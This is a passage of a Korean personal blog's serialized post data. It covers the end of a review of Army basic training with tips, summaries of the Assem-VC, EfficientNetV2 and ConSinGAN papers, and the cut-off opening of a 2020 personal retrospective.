뭔가 많아 보여도 조금 익숙해 지면 금방 할 수 있는 정도에요. 그나마 훈련에서 좀 귀찮았던 부분이, 단독군장(총기, 요대, 탄창, 수통, 방독면, 등등)하고, 총기, 수류탄, 각개 훈련장까지 가야 하는데, *신 생활관*이 훈련장하고 좀 떨어져 있고 + 갈 때마다 멀리 돌아가서 모든 훈련장까지 가는데 편도 4~50분 정도 걸렸어요.\n\n행군은 각개전투 훈련할 때 생긴 일 때문에 급하게 취소가 됐는데, 여백이 부족해서 썰은 나중에...\n\n### 근력측정\n\n우리 분대엔 운동선수 출신도 있고 운동을 평소에 하던 사람들도 있어서, 생각보다 다들 성적이 괜찮았어요. 저도 평소에 꾸준히 운동을 하고 있어서 개인적으로 가장 고대한 시간인데, 저는 팔굽혀펴기 84개, 윗몸일으키기 56개로, 팔굽혀펴기만 특급을 달성했습니다. 평소에 코어 운동을 좀 게을리했는데, 코어 좀 더 빡세게 조져야겠네요. 달리기는 원래 개인 3km 달리기에서 분대 단위로 1.5km 달리기로 바뀌었어요.\n\n방 분위기도 저를 포함해서 운동선수인 분들이 식사/샤워 전에 운동하니까, 다른 사람들도 다 따라서 하더라고요. 그래서 항상 식사/샤워 전 시간에 방 분위기는 거의 뭐 헬스장이었어요.\n\n## 이 외 생활\n\n다른 곳은 모르겠지만, 여기는 가끔 신청 곡도 틀어주고 첫날에 중대장님인가 센스로 자장가도 틀어주고, 격리 주차엔 밥 먹고 산책도 해 주고, 여러 복지(?)도 누릴 수 있었어요.\n\n3주 일정이 빡빡해서인지, 주말이나 공휴일에는 일정이 없는 날인데, 이런 날에도 교육이나 자잘한 것들을 계속 시켜서 좋게 말하면 시간이 빨리 갔고, 나쁘게 말하면 편하게 쉴 시간이 별로 없었어요.\n\n### 생활관\n\n원래는 *구 생활관*이라 해서, 기존에 사용하던 생활관에서 생활해야 하는데, 어떤 이유인지 *신 생활관*(*구 생활관*에서 육교 건넌 반대면 훈련소)에서 생활했습니다. 여쭤보니, 이번 기수만 잠시 *신 생활관*에서 생활하다 다시 *구 생활관*으로 돌아간다고 하더라고요.\n\n같은 중대 어느 소대에서 첫날에 코로나 추정자가 발견돼서 그 소대 전부는 구 생활관에서 격리했다는데, 저는 안 가봐서 어떤 환경인진 모르겠네요. 신 생활관은 시설은 나름 깔끔했어요.\n\n화장실 & 세면장도 운이 좋았어요. 생활관 1층을 총 3개의 소대(1~3)가 사용하는데, 화장실과 세면장이 각 라인에 1곳 밖에 없었어요. 1, 2소대가 건물 정면에 있어서 같은 세면장을 사용하고, 3소대는 측면에 따로 떨어져 있어서, 3소대(16명 * 4분대 = 64명)가 독점으로 세면장을 사용했어요.\n\n세면장 이용을 분대별 순서대로 진행하는데, 앞 분대에서 느리게 씻어서 마지막 순서로 샤워하는 날에는 길면 2시간 정도 대기하다가 찬 물로 샤워를 해야 하는 상황이 꽤 있었어요.\n\n### 부식\n\n원래 이런진 모르겠지만, 부식을 엄청나게 많이 받았는데, 틈만 나면 이온/탄산음료, 초코바, 과자, 사탕 등등 엄청나게 주더라고요. 그래서 마지막 날에 입고 온 사복 입고 나가는데, 다들 살이 겁나게 쪄서 옷이 안 맞는 헤프닝도 일어났어요.\n\n### 아침 구보\n\n격리 하니, 아침에 비 온다니, 여러 이유들 때문에 아침 구보를 한 번 밖에 못 했어요 ㅠㅠ. 갠적으로 매일 아침 뛰고 싶었는데, 못 뛰어서 매우 아쉽네요.\n\n### PX & 전화\n\n케바케긴한데, 워리어카드, TOP10카드라 해서, 활동에 열심히 참여한 분대에 주는 포상이 있는데, 이런 포상까지 다 합쳐서, PX는 4~5번, 전화는 거의 6번 정도 한 듯합니다. 분, 소, 중대장 훈련병, 사격 도움이는 추가로 더 이용. 처음에 PX는 잘해야 2번 가고, 전화도 거의 못 한다는 소리를 들어서, 친구들 집 주소만 챙기고 전화번호를 안 적어 갔는데, 좀 후회되네요.\n\n구매 금액은 음식들은 한 번에 5 ~ 8000원, 금지 품목 이외엔 무제한이라고 했는데, 다른 사람들 보니 음식만 3만 원 정도 사도 따로 뭐라 하지는 않는 듯 해요. 전, 과자나 음료수 군것질을 평소에 안 해서 PX를 가도 딱히 살 게 없어서 만 원 정도 썼으려나 해요.\n\n다른 후기를 보니 PX에서 산 식품들을 즉시 처리해야 하던데, 따로 그런 제한은 없었어요.\n\n### 종교\n\n종교 활동은 2 주차 주말에 갈 수 있는데, 요즘은 코시국이라 [실로암](https://www.youtube.com/watch?v=NRAKho-OMHM)같은 광기는 보기 힘들고, 긴 의자에 한 명씩 건너 앉아서 그냥 조용한 분위기라 캅니다. 회사 분께서 그냥 자는게 이득이라 해서 안 가고 남은 사람들끼리 수다나 떨었는데, 만약 재미를 바라고 가는거라면 조금은 실망할 수 있을 듯 해요.\n\n## 팁\n\n작년에 훈련소 같다 온 친구가 블로그에 잘 정리해준 준비물보고 준비했는데, 정말 도움 많이 됐어요. 여기 -> [준비물 리스트](https://blinglnav.tistory.com/entry/%EC%82%B0%EC%97%85%EA%B8%B0%EB%8A%A5%EC%9A%94%EC%9B%90-%ED%9B%88%EB%A0%A8%EC%86%8C-%EB%AD%98-%EA%B0%80%EC%A0%B8%EA%B0%80%EC%95%BC%ED%95%A0%EA%B9%8C)\n\n여기서 강조하고 싶은 것들만 또 써 보자면...\n\n* 책 1~2권으론 부족하다. 스도쿠나 책을 더 가져가자.\n* 머리는 케바케, 안전빵으로 15~20mm. 굳이 더 짧게 밀 필요는 없을 듯해요.\n* **면봉**, **물티슈** 넉넉하게. 총기 청소하고, 뭐 닦을 때 필수품\n  * 총기 검사도 마지막 주에 하는데, 청소 뭐 열심히 해야 통과된다 겁 주는데, 그냥 적당히 하심 됩니다.\n* **이어플러그** 진짜 정말 **필수**템입니다. 밤마다 부조화로운 오케스트라를 감상하는 경험을 피하고 싶다면...\n* 상하의, 신발 사이즈를 알아자가.\n  * 인치 기준이 아니라, 적당히 100, 105 이런 사이즈로 알아가자.\n  * 구체적인 사이즈는 어떤 느낌인지 대충 알려주신다.\n* 각개전투\n  * 요대, 탄띠를 최대한 빡세게 조이자. 각개할 때 땅에서 구르는데, 요대나 탄띠가 풀리면 꽤 골치 아프다.\n  * 각개전투 중 화생방 상황에서, 방독면을 써야 하는데, 안경 쓴 사람은 마스크와 안경을 더럽혀지고 깨지지 않게 잘 보관해야 하는 불편함이 있어요.\n  * 마스크가 흙먼지 범벅이 되니, 여분으로 몇 개 가져가고, 안경은 스페어안경, 방독면 쓸 때는 미리 왼쪽 가슴 주머니에 마스크하고 같이 보관하면 안전하다.\n  * 무릎, 팔꿈치 보호대를 준비하자. 없이 하면 확정으로 상처 나거나 멍이 든다. 만약 준비하지 못했다면, 보급으로 받은 긴 양말을 무릎하고 팔꿈치에 묶자.\n* **분,소,중**대장 훈련병 비추. 매우 귀찮습니다.\n  * 지원자가 없으면, **확정 가챠**를 돌리는데, 귀찮을 걸 싫어한다면 피하시길\n* 소대별로 담당 구역을 정하는데, 분리수거, 배식 등등이 있어요.\n  * 담당 구역 정하는 방식은 다 다른 듯 해요.\n  * 우리 소대는 마지막 주에 배식을 담당했어요. (배식이 제일 빡셉니다)\n  * 배식에도 여러 직무가 있는데, `손 소독제 짜주기` >>> `부식 담당` >> ... >>>> `짬 처리` >>>>>>>>> `식기세척` 입니다. 꼭 기억하세요!\n  * `식기세척`이나 `짬 처리`만 피하시면 육체&정신 건강에 좋습니다.\n* 인편은 많을수록 좋다.\n* 편지\n  * 제가 5일, 7일 차에 편지를 보냈는데, 거의 마지막 주 월요일에 도착하더라고요.\n  * 편지 발송에 대한 비밀(?)을 들었는데, 일반우편이 군사우편보단 빠르게 가지만, `군대에서 일정 편지 수를 달성하기 전까진 편지를 군대 밖으로 보내지 않아서 어떻게 보내든 늦게 보내진다는 사실`을 알려주더라고요. 이제 3주로 훈련 기간도 줄어서 첫 주안에 편지를 보내지 않으면, 이후에 보내는 편지는 아마 수료하고 도착할 가능성이 높아요.\n  * 그래서 편지를 빨리 보내고 싶다면, 우표를 여러 장 붙이는 것 보다, 더미 편지를 몇백 장 쓰는 게 더 좋은 방법이라고 분대장 피셜이 있었어요.  \n  * 군사우편은 최대 2장까지 보낼 수 있는데, 1장은 첫 주에 부모님께 보내는 편지 쓰이니 이외에 2편 이상 편지를 쓸 거라면, 편지 봉투와 우표를 따로 챙겨가자.\n\n## 썰\n\n레전드 썰도 정말 많이 생성하고 왔는데, 크게는 8개 정도는 되는 듯 하네요. 요건 나중에 풀어보는 걸루다가 하겠습니다.\n","excerpt":"TL;DR 지난 4월 29일 ~ 5월 20일까지 3주간 육군훈련소를 다녀왔습니다. 들어가기 1주일 전부터 훈련소에서 코로나 격리 수준이 기본권을 침해한다는 등 여러 기사와 썰 들이 돌아다니고, 최근에 다녀온 지인들도 격리주간에 꽤 힘들었다는 말을 들…","fields":{"slug":"/army/"},"frontmatter":{"date":"May 23, 2021","title":"육군훈련소 후기 & 팁","tags":["army"],"update":"May 24, 2021"},"timeToRead":8}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근 mindslab 에서 Cotatron에 이어 새로운 VC (Voice Conversion) 논문이 나와서 논문을 읽게 됐습니다.\n\ncode는 곧 나올 예정인 듯합니다. [issue](https://github.com/mindslab-ai/assem-vc/issues/1)를 보니 mid-june 에 release 할 가능성이 있다고 카네요.\n\npaper : [arXiv](https://arxiv.org/pdf/2104.00931.pdf)\n\ncode : [github](https://github.com/mindslab-ai/assem-vc)\n\ndemo : [demo](https://mindslab-ai.github.io/assem-vc/)\n\n## Related Work\n\n요 논문과 관련높은 reference\n\n1. Cotatron : [paper](https://arxiv.org/pdf/1905.11946.pdf), my review : [review](https://kozistr.tech/Cotatron/)\n\n## Introduction\n\n논문 제목부터 보면 *Assem-VC* 인데, 가존에 제안된 여러 VC 모델들의 장점들을 잘 조합해 하나로 만들어 둔 느낌입니다. \n*2. Approach* 를 보면, `Cotatorn-VC`, `Mellotron-VC`, `PPG-VC` 이렇게 3개의 모델을 baseline으로 해서 만들었다고 합니다.\n\n그리고 3가지의 components로 나눠 살펴보는데, 다음과 같습니다.\n\n1. linguistic encoder\n2. intonation encoder\n3. decoder\n\n% `PPG` : phonetic posteriorgrams\n\n`Auto-VC` 논문에서 저자가 source speaker의 linguistic, intonation 정보가 bottleneck 부분에 들어가게 되면 self-reconstruction 퀄리티를 떨어트린다고 합니다.\n즉, **speaker independent** 하게 학습해야 양질의 conversion 이 가능하다고 합니다.\n\n`Auto-VC` 논문을 읽어보진 않았지만, speaker specific 한 정보가 reconstruction 과정에 들어가면, speaker-biased 된 학습이 이뤄질 수 있어 speaker-overfitted, not generalized 한 모델이 만들어 짐을 유도하는 맥락같다는 생각이 드네요. (저도 이런 argument에 동의합니다)\n\n쨋든, 이런 이유로 encoder design 을 speaker independent하게 만들었다고 합니다.\n\n## Architecture\n\n![architecture](architecture.png)\n\n구체적으로 하나하나 보기 전에 전체적으로 한번 훑어보면, \n`Cotatron-VC` 와 `Normalized-F0` 로 linguistic, intonation features (speaker-independent)를 생성하고, \n이 정보들과 target speaker를 encoding한 정보와 같이 decoder에 넣어 mel-spectrogram 을 뽑고, 마지막으로 `HiFi-GAN` 으로 raw audio를 생성하는 방식입니다.\n\n### Linguistic Encoder\n\n결론부터 말하자면 `Cotatron-VC` 에 있는 linguistic encoder 를 채택했습니다. \n\n`PPG-VC` 같은 경우엔 time-frame 별로 phoneme 의 posterior probability를 *pretrained speaker-independent ASR* 베이스로 주는 방식인데, \n일단 ASR 를 훈련하려면 많은 양의 transcription 으로 학습한 ASR이 있어야 하고 (-> 어렵), output이 각 phoneme 의 확률만 주는 친구라서 사용하기 흠터레스팅하다 언급합니다.\n\n### Intonation Encoder\n\n이 부분도 결론부터 말하자면 `Cotatron-VC` 에 있는 intonation encoder에 개선점을 추가해 사용했습니다.\n\n`Cotatron-VC`에서 intonation encoder에 해당하는 residual encoder가 **unseen** speakers or noises 에 대해서 잘 하는지는 여전히 의문이라고 합니다.\n\n그래서 `PPG-VC` 와 `Mellotron-VC`에서 채택해 사용하던 `Normalized-F0` 를 사용했다고 합니다.\n\nspeaker voice 를 time frame 별로 log f0를 뽑고 mean/std normalize 후, unvocied segments는 *constant -10*으로 채우는 작업을 했다는데, 구체적인 구현 사항은 논문을 참고하세용.\n\n이런 작업을 해서 pitch contour는 speaker independent해 지면서 decoder 는 speaker 의 pitch range를 잘 잡아 학습 가능하다고 캅니다.\n\n### Decoder\n\n결론은 non-casual decoder를 채택한 듯 합니다.\n\n3개 baseline 중 `Mellotron-VC`만 autoregressive casual decoder 를 사용하는데, 이런 구조가 non-casual decoder 들 보다 더 좋은 퀄의 mel-spectrogram 을 뽑을 수 있다고 합니다.\n\n하지만, teacher forcing method 로 학습하는 과정이 source-speaker에 대해 cheating할 수 있다는 점을 언급해, 실제로는 speaker disentanglement 를 못 지킬수도(?) 있다고 합니다.\n\n논문에선 non-casual decoders (`PPG-VC`, `Cotatron-VC`) 차이도 설명하는데, 논문 참조~\n\n### Vocoder\n\n최근 VC methods를 보면 raw audio 만드는 부분에서 `WaveNet` 기반 vocoder를 사용하는데, 논문에선 real-world 에서는 `WaveNet` 기반 vocoder 는 latency가 나오지 않기 때문에 `HiFi-GAN` 기반으로 생성한다고 합니다.\n\n이 중 포인트는, Ground Truth Alignment (GTA, 왠지 차 훔쳐야 할 거 같은 이름) mel-spec을 finetune시 사용했다고 하는데, \n이 논문에선 GTA mel-spec 부분을 reconstructed mel-spec으로 해석해서 튜닝을 했다고 하네요.\n\n## Train Recipe\n\n훈련 방식에도 차이가 있습니다. 3개의 baselines을 모두 훈련하는데,\n\n먼저, `Cotatron-VC`를 *LibriTTS train-clean* 으로 훈련 후 *LibriTTS* + *VCTK* 로 progressively 훈련헀다고 합니다. \n그리고 `Cotatron-VC` 는 freeze하고 `Assem-AC` 전체 pipeline 을 훈련했다고 합니다.\n\n다른 recipes는 논문에\n\n## Performance\n\n### VC\n\n![benchmark](VC-benchmarks.png)\n\n\n`Assem-VC`가 `MOS`, `DMOS`에서 제일 좋은 성능을 보여주고 있네요.\n\n### Degree of disentanglement\n\n![sca](sca.png)\n\ndisentanglement가 잘 됐는지를 측정하기 위해 `SCA`로 benchmark 합니다. 아마 `Cotatron-VC`논문에서도 `SCA`를 사용했던 것 같은데, 앞으로 다른 연구에서도 `SCA`를 사용하길 바란다고 합니다 ㅋㅋㅋㅋ\n\n개인적으론, `SCA` 값은 일반적인 trend를 보여주는 데엔 괜찮을 수도 있지만, `SCA` 측정에 사용하는 모델 성능과 방식에 따라 variance가 많이 커지지 않을까란 생각이 있어서 더 solid?한 tolerant한 method가 뭐가 있을까 한번 생각해 보게 되네요.\n(higlhy personal thought :), not the answer)\n\n% `SCA` : Speaker Classification Accuracy\n\n## Conclusion\n\n어쩌면 단순 조합이라고도 할 수 있지만, 여러 architecture를 benchmark하고 각 components를 meaningful하게 가져와 사용한 점과 성능도 outperform 해서 좋아 보였습니다. \n\n요즘의 연구 트렌드들이 architecture design을 revisit 하는 연구보단 training recipe & combining network design로 outperform한 성능을 내는 연구가 많아지는 것 같아서, 갠적으로 튜닝을 좋아하는 사람 중 하나고, 이런 recipes를 발견하고 적용하는 게 더 큰 성능 향상을 낼 수 있다 생각하기 때문에, 더 재밌게 읽었던 것 같습니다. \n\n결론 : 굳\n","excerpt":"TL;DR 최근 mindslab 에서 Cotatron에 이어 새로운 VC (Voice Conversion) 논문이 나와서 논문을 읽게 됐습니다. code는 곧 나올 예정인 듯합니다. issue를 보니 mid-june 에 release 할 가능성이 있…","fields":{"slug":"/AssemVC/"},"frontmatter":{"date":"Apr 19, 2021","title":"Assem-VC - Realistic Voice Conversion by Assembling Modern Speech Synthesis Techniques","tags":["Deep-Learning"],"update":"Apr 19, 2021"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nEfficientNet 의 2번째 논문이 나왔네요. 저자는 EfficientNet 을 쓴 두 분이 쓰셨네요.\n\n이번에 나온 논문은 **효율성**을 목표로 한 연구인데, NAS로 모델 훈련 속도와 파라메터 수를 엄청나게 줄이면서 성능도 comparable 하거나 더 좋은 성능을 달성했다고 합니다.\n\npaper : [arXiv](https://arxiv.org/pdf/2104.00298.pdf)\n\ncode : [github](https://github.com/google/automl/tree/master/efficientnetv2)\n\n## Related Work\n\n요 논문과 관련높은 reference\n\n1. EfficientNet : [paper](https://arxiv.org/pdf/1905.11946.pdf)\n\n## Introduction\n\n최근에 나온 convolution 기반 architectures 를 보면 (e.g. ResNet-RS, NFNet), \n성능은 좋지만, 모델 파라메터가 너무 많고 FLOPs 도 엄청나게 커서 웬만한 장비 아니면 훈련하기도 빡센 문제가 있어요.\n\n## Training Efficiency\n\n### Training with very large image sizes is slow\n\n큰 크기의 이미지를 사용하면 작은 batch size를 사용해야 하는 점이 속도 저하의 원인임을 언급하면서,\n훈련 시에 progressively 이미지 크기를 조정하는 방향으로 이런 문제를 개선했다고 합니다. \n\n### Depthwise Convolutions are slow in early layers\n\nEfficientNet architecture에는 *MBConv* 라는 block 이 있는데, depth-wise convolution 이 사용되죠.\n그런데, 요 연산이 tpu/gpu 에서 제대로 가속을 못 받아서 일반적으로 사용하는 convolution 연산보다 파라메터나 FLOPs 는 작지만 속도가 느려요.\n\n최근 연구들에는 이런 문제때문에 *Fused-MBConv* 라는 걸 만들었는데, \n아래 그림처럼 `Conv 1x1 + depthwise Conv 3x3` -> `Conv 3x3` 으로 replace 한게 더 좋다는 연구를 언급하면서\n\n![MBConv](mbconv.png)\n\nEfficientNet-B4 에 gradually *Fused-MBConv* 를 적용해 봤는데, **early layers** (1 ~ 3 stages) 에만 적용하는게,\n속도도 빠르면서 성능도 제일 좋게 가져갈 수 있었다고 합니다.\n\n### Equally scaling up every stage is sub-optimal\n\nEfficinetNet 에선 compound scaling rule 에 따라서 scaling 하는데, 만약 depth coef 가 2라면, 모든 stages 에서 2로 scaling 합니다.\n그런데, 각 stages 에서 훈련 시간과 파라메터 수는 equally contributed 안하는 문제점을 들면서, *non-uniform* 한 scaling 전략을 선택하겠다고 합니다.\n\n이미지 사이즈 같은 경우도 훈련 시간과 memory 에 큰 영향을 주기 때문에, (image size에 대한) scaling rule 도 변견했다고 합니다.\n\n## Training-Aware NAS and Scaling\n\n### NAS Search\n\n모델 훈련 속도를 위한 best combination 을 찾기위해, training-aware NAS 을 제안합니다.\n\nEfficientNet에서 사용한 NAS 기반을 했는데, 아래와 같은 목표를 joinly optimize 했다고 합니다.\n\n1. accuracy\n2. parameter-efficiency\n3. training-efficiency (on modern accelerators)\n\n구체적인 settings 은 논문에\n\n### EfficientNetV2 Architecture\n\nNAS를 사용해서 찾은 architecture (EfficientNetV2-S, baseline) 가 아래와 같은 구조라 합니다. EfficientNet 과 크게 4가지 차이점이 있다 하는데,\n\n1. *MBConv* 와 *Fused-MBConv* 를 섞어서 씀\n2. 더 작은 expansion ratio (for *MBConv*) 를 사용 -> 더 적은 overhead 를 가지기 때문\n3. 3x3 kernel sizes 를 선호. (하지만 작은 receptive field를 사용하는 만큼 layer를 더 쌓게 됨)\n4. EfficientNet 에 있던 맨 마지막 stride-1 stage 를 제거. -> 이것도 메모리 때문에\n\n![EfficinetNetV2-S](efficientnetv2-s.png)\n\n### EfficientNetV2 Scaling\n\n위에서 만든 EfficientNetV2-S 기반으로 M/L 버전도 만들었는데, 몇 가지 제한을 두고 scaling 했다고 합니다.\n\n1. maximum inference image size to 480\n2. add more layers to later stages (stage 5, 6)\n\n![acc_vs_step](accuracy_vs_training_step.png)\n\n## Progressive Learning\n\n훈련 시 image size 를 dynamic 하게 사용하는데, 이전 연구들은 accuracy drop 이 발생했다고 합니다.\n이번 논문에선 그런 accuracy drop이 *imbalanced regularization* (다른 이미지 크기로 학습하면 거기에 맞는 regularization strength를 사용해야 한다)에서 오지 않을까 추측합니다.\n\n아래와 같이 regularization strength를 실험해 본 결과, 추측한 대로 image size 가 작을 땐 weak augmentations, 클 땐 strong augmentations이 성능향상에 더 도움됐다고 합니다.\n\n![regularization_strength](regularization_strength.png)\n\nProgressive Learning 을 하기 위해서 fomulation을 세웠는데, 아래와 같습니다.\n\n전체 훈련을 $N$ steps를 하고 훈련 과정을 $M$ stages로 나눴고, $k$ 는 regularizations 종류 (e.g. RandAugment, MixUp, Dropout, ...)\n\n![progressive_learning](progressive_learning.png)\n\n각 모델은 아래와 같은 recipes 로 훈련했다고 합니다.\n\n![recipe](progressive_learning_recipes.png)\n\n## Benchmark\n\n### ImageNet\n\naccuracy, training speed 측면에서 EfficientNet 대비 다 좋네요.\n\n![performance](performance.png)\n\n![efficiency](efficiency.png)\n\n### Transfer Learning Performance Comparison\n\n다른 datasets 에 transfer learning 했는데, 성능이 comparable 하네요.\n\n![transfer_learning](transfer_learning.png)\n\n## Conclusion\n\n새로운 아이디어보단 여러 가지를 조합하고 training recipe 실험에 가까웠지만, 갠적으로 이런 튜닝 성격의 연구도 좋아하고, 엄청난 개선이 있어서 재밌게 읽었습니다.\n\n결론 : 굳굳\n","excerpt":"TL;DR EfficientNet 의 2번째 논문이 나왔네요. 저자는 EfficientNet 을 쓴 두 분이 쓰셨네요. 이번에 나온 논문은 효율성을 목표로 한 연구인데, NAS로 모델 훈련 속도와 파라메터 수를 엄청나게 줄이면서 성능도 compara…","fields":{"slug":"/EfficientNetV2/"},"frontmatter":{"date":"Apr 02, 2021","title":"EfficientNetV2 - Smaller Models and Faster Training","tags":["Deep-Learning"],"update":"Apr 02, 2021"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이전에 리뷰했던 SinGAN 후속 논문이 나왔는데, 우연히 github 메인 페이지 오른쪽에 보면 Explore repositories가 있는데, 여기에 추천 repo로 떠서 우연히 보게 됐습니다.\n\n저자분께서 짧은 요약을 블로그에 정리해서, 논문 대신 아래 글을 읽어도 충분할 듯하고, SinGAN 이랑 비교/대조하는 부분이 있어서 SinGAN 논문도 읽어보시는 걸 추천드려요.\n\nofficial summary : [blog](https://www.tobiashinz.com/2020/03/24/improved-techniques-for-training-single-image-gans.html)\n\npaper : [WACV21](https://openaccess.thecvf.com/content/WACV2021/papers/Hinz_Improved_Techniques_for_Training_Single-Image_GANs_WACV_2021_paper.pdf)\n\ncode : [github](https://github.com/tohinz/ConSinGAN)\n\n## Related Work\n\n요 논문과 관련높은 references\n\n1. SinGAN : [paper](https://arxiv.org/pdf/1905.01164.pdf), [my review](https://kozistr.tech/SinGAN/)\n2. ProGAN : [paper](https://arxiv.org/pdf/1710.10196.pdf)\n\n## Introduction\n\n논문을 읽기 전, 전반적인 느낌은 논문 제목부터 Con**SinGAN**인 것처럼, SinGAN에 여러 techniques를 추가해 성능을 improved 한 느낌입니다.\n또, Con (Concurrent)라 명칭 한걸 보니, 각 generators 를 concurrent 하게 학습한다는 느낌을 받았는데, 자세한 건 논문을 읽어봐야겠어요.\n\n이 논문에서, 크게 **3가지의 main contributions** 이 있습니다.\n\n1. architecture & optimization\n2. 이미지 rescaling (for multi-stage training)\n3. fine-tuning\n\n## Methodology\n\n### Multi-Stage Training\n\n#### Random Noise\n\nmodel architecture 같은 경우 **SinGAN**과 대조를 하는데, \n**SinGAN**도 multi-stage generators 를 가지고 있는데, 가장 낮은 resolution에 해당하는 generator만 unconditional generator 라고 말하고 있습니다.\n\n즉, **SinGAN** 은 최초에만 noise (~= z latent vector)로 부터 이미지를 생성하고, 이후 stages 는 random 한 요소가 들어가지 않는다는 말입니다.\n\n![architecture](architecture.png)\n\n위는 ConSinGAN 의 model architecture 인데, **diversity**를 높히기 위해 매 stage 마다 이전 stage 의 생성 결과와 random noise가 같이 합쳐서 들어가고 있습니다.\n\n#### Freeze Previous Generator\n\n그리고, 현재 (n) stage를 훈련할 때 이전 (n - 1) stage의 generator를 freeze 한다는 차이도 있습니다.\n\n이런 방식으로 concurrently 하게 한 번에 여러 stages 의 generator 를 학습하는데, 한 번에 모든 stages의 generator를 학습하면 overfitting 가능성이 커지니, \n**적당히 한 번에 3 stages** 를 훈련한다고 합니다.\n\n#### Learning Rate\n\n또한, 한 번에 3개의 generators 를 훈련하는데, 각 stage 마다 다른 learning rate 를 사용했습니다.\n\n예를 들어, Generator (n - 2), (n - 1), (n) 을 학습한다면, (0.01 * lr), (0.1 * lr), (lr) 식으로 (10배 씩 decay 해) 사용했다 합니다.\n\n물론, 이렇게 learning rate 를 사용하는 것에 대한 이야기도 했는데, \n\n1. lower generators 에서 higher learning rate 사용 : training image 에 더 similar 한 image 를 만들겠다.\n2. lower generators 에서 lower learning rate 사용   : 더 높은 diversity 를 가져가겠다 (~= maybe leads to worse quality) \n\n이렇게 말하면서, learning rate 란 artifact 에 대한 sample 변화도 보여줬습니다.\n\n![lr](changing_by_lr.png)\n\n#### Discriminator\n\nDiscriminator로 Patch Discriminator 를 사용하는 것에 대해, 이미지의 일부로만 판단하면 global perspective 에서 real or fake 확인이 어렵다는 점을 언급합니다.\n\n### Rescaling Image\n\n각 generators 에 들어가는 image resolution 에 대한 내용인데, multi-stage scheme 으로 여러 resolution 으로 progressive 하게 generate 하는 것은 좋은데,\n그럼 이걸 얼마나 해야 하냐? 라는 의문을 제기합니다.\n\nSinGAN 같은 경우엔 주로 8 ~ 10 stages 를 통과하는데, 아래와 같은 formulation 으로 써 볼 수 있습니다.\n\n> $x_{n} = x_{N} × r^{N−n}, r = 0.75$\n\n논문에선 8 ~ 10 stages 는 좀 많다라고 이야기하면서, 적절한 scaling factor & stages 를 찾는 시도를 합니다.\n\n1. scaling factor 가 높고 stages 가 많아지면, 훈련의 안정성이나 (image) global coherence 가 높은 장점이 있겠지만, 그만큼 학습이 느려지고,\n2. scaling factor 가 낮고 stages 가 적어지면, 학습이 빨라지는 대신, global coherence 를 잃는 문제가 발생하겠죠.\n\n또한, high resolution 에서는 많은 stages 가 필요하지 않다는 점을 언급하면서, 이런 요소를 반영해 다음과 같은 formulation 을 제안했습니다.\n\n> $x_{n} = x_{N} × r^{((N - 1) / log(N)) * log(N - n + 1)}, n \\in [0, N)$\n\n![scale](rescale.png)\n\n차이는 아래와 같습니다. (scaling factor 0.55 <- 논문에서 언급한 값)\n\n1. old scaling : 25×34, 38×50, 57×75, 84×112, 126×167, 188×250\n2. new scaling : 25×34, 32×42, 42×56, 63×84, 126×167, 188×250\n\nscale factor를 0.55로 논문에선 설정했는데, 계산해 보면 scaling factor 값이 조금 이상하네요.\n\n### Fine-Tune\n\n마지막으로, image harmonization task를 위한 fine-tuning에 대해서도 언급합니다.\n\n간단하게 설명하면, 먼저 source image에 대해 학습을 하고, 이후에 reference image에 대해 학습을 하면 더 좋은 성능을 낼 수 있다고 캅니다.\n\n## Benchmark\n\n### Confusion & SIFID\n\nSinGAN 하고 비교했을 때, SIFID 가 더 좋아진 걸 볼 수 있었고, 훈련 시간, 학습해야 하는 모델 파라메터 수도 2배 정도 줄었음을 확인\n\n![perf](place_benchmark.png)\n\n![perf](lsun_benchmark.png)\n\n### Diversity\n\n논문에서 중요하게 생각하던 Diversity 도 보면, SinGAN 대비 comparable 하거나 low 한 diversity score 가 나왔습니다.\n\n| DataSet\\Model | SinGAN | ConSinGAN |\n| :---: | :---: | :---: |\n| Place | 0.52 | 0.50 (0.43) |\n| LSUN  | 0.64 | 0.54 |\n\nPlace dataset benchmark 중 괄호는 learning rate scaling factor 를 0.1 에서 0.5로 올렸을 때, diversity 감소가 발생했다는 걸 보여주고 있습니다.\n\nLSUN dataset 에선 global structure 를 catch 하지 못한 게 낮은 diversity score를 얻었다는 것으로 해석합니다.\n\n### Image Harmonization\n\n![harmonization](harmonization.png)\n\n## Conclusion\n\n개인적으로 새로운 idea를 제안하는 논문도 좋아하지만, 이런 training recipe 튜닝하는 걸 좋아해서 개인적으로 가볍고 재밌게 읽었습니다.\n\n결론 : 굳\n","excerpt":"TL;DR 이전에 리뷰했던 SinGAN 후속 논문이 나왔는데, 우연히 github 메인 페이지 오른쪽에 보면 Explore repositories가 있는데, 여기에 추천 repo로 떠서 우연히 보게 됐습니다. 저자분께서 짧은 요약을 블로그에 정리해서…","fields":{"slug":"/ConSinGAN/"},"frontmatter":{"date":"Mar 25, 2021","title":"ConSinGAN - Improved Techniques for Training Single-Image GANs","tags":["Deep-Learning"],"update":"Mar 25, 2021"},"timeToRead":5}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n올해 처음으로 회고록을 적어보는데, 사실 작년부터 써야지 생각만 하다 결국 놓쳤는데, 벌써 1년이 지나 쓸 때가 온 걸 보고 시간은 정말 빨리 가는 걸 실감하며, 2020년 회고지만 지난 2년 동안 일어났던 작고 큼지막한 일들을 하나씩 적어보려고 해요.\n\n나중의 이 글을 다시 보게 됐을 때, 내가 어떤 게 부족했고 이 정도나 성장했다는 걸 느낄 수 있게 글로 남겨보려고 해요. 그럼 의식이 흘러가는 데로 한번 적어볼게yo\n\n## 회사\n\n어쩌다 보니 지난 2년 동안 총 3곳의 회사를 경험했어요. 여러 이유가 있는데...\n\n### 첫 번째 회사\n\n작년 2019년, 서울에 있는 한 머신러닝 스타트업에서 *머신러닝 개발자*로 사회생활을 시작하게 됐어요. 학교와 현장실습체험 연계 겸사겸사 시작한 인턴이었고, 내가 원했던 분야의 직무로 취직하게 돼 기쁨과 동시에 내가 잘 할 수 있을까 많은 걱정을 하던 출근 하루 전날이 기억나는데, 저에겐 정말 값진 경험과 좋은 사람들을 만날 수 있었던 하루하루가 설레고 즐거웠던 9개월이었어요. 제 실력이나 커뮤니케이션이 부족한 탓에 팀원에게 미안한 것, 실수한 것도 많이 떠오르며 몇몇 분들도 생각나는데, 그래도 그런 저를 이해해줬던 모두에게 정말 감사해요.\n\n한 번은 업무에 집중하지 못할 정도로 번-아웃이 온 